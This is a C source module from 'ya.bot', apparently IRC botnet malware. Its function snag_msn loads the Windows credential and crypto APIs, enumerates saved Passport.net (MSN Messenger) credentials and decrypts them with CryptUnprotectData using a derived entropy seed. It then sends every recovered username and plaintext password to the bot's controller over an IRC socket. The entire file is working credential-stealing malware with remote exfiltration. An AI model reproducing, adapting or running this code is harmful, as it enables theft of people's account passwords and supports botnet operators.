/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_SNAGMSN

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Gregory R. Panakkal
//http://www.infogreg.com/
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool snag_msn(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	char szSeed[37];
	DWORD dwCount;
	DATA_BLOB blobCrypt, blobEntropy, blobPlainText;
	HMODULE hModule;
	int i, nEntropyData[37], nTemp;
	PCREDENTIAL *CredentialCollection;
	typedef bool (WINAPI *pCredEnumerateA)(LPCTSTR, DWORD, DWORD *, PCREDENTIALA **);
	typedef void (WINAPI *pCredFree)(PVOID);
	typedef bool (WINAPI *pCredReadA)(LPCTSTR, DWORD, DWORD, PCREDENTIALA *);
	typedef BOOL (WINAPI *pCryptUnprotectData)(DATA_BLOB *,
			LPWSTR *,
			DATA_BLOB *,
			PVOID,
			CRYPTPROTECT_PROMPTSTRUCT *,
			DWORD,
			DATA_BLOB *);
	pCredEnumerateA xCredEnumerateA;
	pCredFree xCredFree;
	pCredReadA xCredReadA;
	pCryptUnprotectData xCryptUnprotectData;

#ifndef NO_DEBUG
		debug_print("Snagging MSN, snag_msn()");
#endif

	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagmsngettingcredentials,
					CBLUE, string_replysnag, CEND, string_replydotbot);
		strncpy(szSeed, string_snagmsnseed, sizeof(szSeed));
		hModule = LoadLibrary(string_snagmsncryptdatalibrary);
	if (!hModule)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		xCryptUnprotectData = (pCryptUnprotectData)GetProcAddress(hModule,
				string_snagmsncryptunprotecteddatafunction);
	if (!xCryptUnprotectData)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		hModule = LoadLibrary(string_snagmsncredentiallibrary);
	if (!hModule)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		xCredEnumerateA = (pCredEnumerateA)GetProcAddress(hModule,
				string_snagmsncredenumeratefunction);
	if (!xCredEnumerateA)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		xCredFree = (pCredFree)GetProcAddress(hModule, string_snagmsncredfreefunction);
	if (!xCredFree)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		xCredReadA = (pCredReadA)GetProcAddress(hModule, string_snagmsncredreadfunction);
	if (!xCredReadA)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
		xCredEnumerateA(string_snagmsnpassportnet, 0, &dwCount, &CredentialCollection);
	if (!dwCount)
	{
		if ((!bSilent) && (bVerbose))
				irc_message(bsock, pszAction, pszDestination,
						(char *)string_snagendofsnag,
						CBLUE, string_replysnag, CEND, string_replydotbot);
			return FALSE;
	}
	for (i = 0; i < (int)strlen(szSeed); i++)
	{
			nTemp = (int)szSeed[i];
			nTemp <<= 2;
			nEntropyData[i] = nTemp;
	}
	for (i = 0; i < (int)dwCount; i++)
	{
			blobEntropy.pbData = (BYTE *)&nEntropyData;
			blobEntropy.cbData = sizeof(nEntropyData);
			blobCrypt.pbData = CredentialCollection[i]->CredentialBlob;
			blobCrypt.cbData = CredentialCollection[i]->CredentialBlobSize;
		if (xCryptUnprotectData(&blobCrypt,
					NULL,
					&blobEntropy,
					NULL,
					NULL,
					1,
					&blobPlainText))
		{
				Sleep(FLOOD_DELAY);
			if (!bSilent)
					irc_message(bsock, pszAction, pszDestination,
							(char *)string_snagmsncredentialinfo,
							CGREEN, string_replysnag, CEND, string_replydotbot,
							CBLUE, CEND, CredentialCollection[i]->UserName,
							CBLUE, CEND, blobPlainText.pbData);
				Sleep(FLOOD_DELAY);
		}
	}
		xCredFree(CredentialCollection);
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_snagendofsnag,
					CBLUE, string_replysnag, CEND, string_replydotbot);
		return TRUE;
}
#endif